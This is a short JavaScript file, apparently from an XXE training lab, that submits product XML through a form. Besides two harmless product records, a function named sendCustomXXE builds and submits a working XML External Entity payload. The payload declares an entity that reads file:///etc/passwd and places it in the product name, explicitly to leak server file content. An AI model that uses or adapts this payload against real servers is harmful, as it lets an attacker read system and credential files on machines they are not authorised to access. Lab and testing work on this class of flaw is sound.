function sendXML(code) {
    let xml = '';
    if (code === '100') {
        xml = `
        <products>
            <product>
                <name>Television</name>
                <code>100</code>
                <tags>entertainment</tags>
                <description>This is a pretty cool TV!</description>
            </product>
        </products>`;
    } else if (code === '101') {
        xml = `
        <products>
            <product>
                <name>Refrigerator</name>
                <code>101</code>
                <tags>appliance</tags>
                <description>Chills your food like a pro.</description>
            </product>
        </products>`;
    }

    document.getElementById('xmlInput').value = xml;
    document.getElementById('xmlForm').submit();
}

function sendCustomXXE() {
    const xxe = `
    <?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <products>
        <product>
            <name>&xxe;</name>
            <code>999</code>
            <tags>pwn</tags>
            <description>Leaking server file content</description>
        </product>
    </products>`;

    document.getElementById('xmlInput').value = xxe;
    document.getElementById('xmlForm').submit();
}
